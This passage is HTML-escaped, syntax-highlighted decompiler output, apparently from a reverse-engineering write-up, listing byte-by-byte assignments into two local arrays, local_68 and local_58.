&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xdf
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x80
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xfa
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x10&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3a
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x10&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5f
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x11&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x39
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x11&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x66
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x12&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x39
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x12&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5f
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x13&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5f
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x13&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x30
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x14&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x93
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x14&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe1
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x15&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5f
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x15&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x16&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x70
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x16&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x17&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x46
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x17&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x33
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x18&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe1
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x18&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x82
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x19&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb9
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x19&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd1
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1a&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3c
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1a&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;99
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1b&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3b
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1b&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5a
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1c&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x76
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1c&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x29
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1d&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2c
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1d&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x40
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1e&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x48
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1e&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x27
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1f&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xae
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1f&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc0
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x20&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x6a
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x20&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x21&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd7
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x21&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x88
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x22&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4b
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x22&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x38
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x23&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa2
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x23&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd6
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x24&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xbf
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x24&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xcd
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x25&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc1
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x25&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa8
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x26&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xee
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x26&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x80
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x27&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xba
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x27&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xdd
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x28&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;100
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x28&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3b
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x29&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xbb
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x29&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd2
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2a&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xbb
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2a&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd5
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2b&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb7
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2b&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe8
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2c&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb6
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2c&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc2
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2d&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc6
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2d&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xae
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2e&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x49
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2e&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x20
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2f&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe0
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2f&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x93
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x30&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb3
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x30&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xec
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x31&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x23
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x31&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x40
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x32&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x85
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x32&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xed
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x33&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x58
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x33&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3d
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x34&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa1
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x34&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc2
&lt;&#x2F;span&gt;&lt;span&gt;local_68[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x35&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xd
&lt;&#x2F;span&gt;&lt;span&gt;local_58[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x35&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x66
